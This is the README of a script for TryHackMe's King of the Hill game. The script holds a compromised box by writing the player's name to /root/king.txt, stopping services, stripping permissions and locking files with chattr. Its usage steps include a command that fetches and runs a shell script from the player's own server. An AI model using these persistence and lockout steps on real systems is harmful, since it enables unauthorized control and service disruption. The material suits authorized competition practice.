# The KOTH Script

<div style="display: flex; justify-content: center;">
  <script src="https://tryhackme.com/badge/1262708"></script>
</div>

**NOTE: Respect TryHackMe Rules**

**The KOTH Script is intended for recreational purposes within authorized environments, such as private games. Always adhere to the rules and guidelines provided by TryHackMe or any other platform you are using. The creator of this script is not responsible for any misuse or violation of terms. Use it responsibly and ethically.**

The KOTH Script is a powerful tool created by H3X-007 to ensure that you are the ultimate KING in King of the Hill challenges. It automates various actions and configurations to secure your position as the reigning champion.

## Features

- Sets the user nickname as the KING in the `/root/king.txt` file.
- Applies necessary patches to enhance security.
- Stops critical services like Tomcat, Nginx, and MariaDB.
- Restricts file permissions and removes certain executables.
- Monitors and updates the KING nickname in real-time.

## Usage

1. Clone the repository:
    
       git clone https://github.com/H3X-007/KOTH-Scripts.git

2. Change to the KOTH-Scripts directory:
       
       cd KOTH-Script 

3. Start a Python HTTP server on port 80:
  
       python3 -m http.server 80  

4. On the KOTH machine, execute the KOTH.sh script:
  
       wget http://YOUR-VPN-IP/KOTH.sh && chmod +x KOTH.sh && ./KOTH.sh

5. Enter your desired nickname when prompted.

6. Sit back and enjoy being the KING! The script will continuously update the KING nickname in the `/root/king.txt` file to maintain your dominance.

#### NOTE : Please ensure that the Python server is running on port 80 before executing the KOTH script.The KOTH script relies on the server to retrieve and run the check & chattr & guardian scripts.

## Contributing

Contributions are welcome! If you have any suggestions, bug reports, or feature requests, please open an issue or submit a pull request.

## Note
Please comment out the lines that include "chattr -i" and "chattr +i" when you want to run the script on "Production" game.
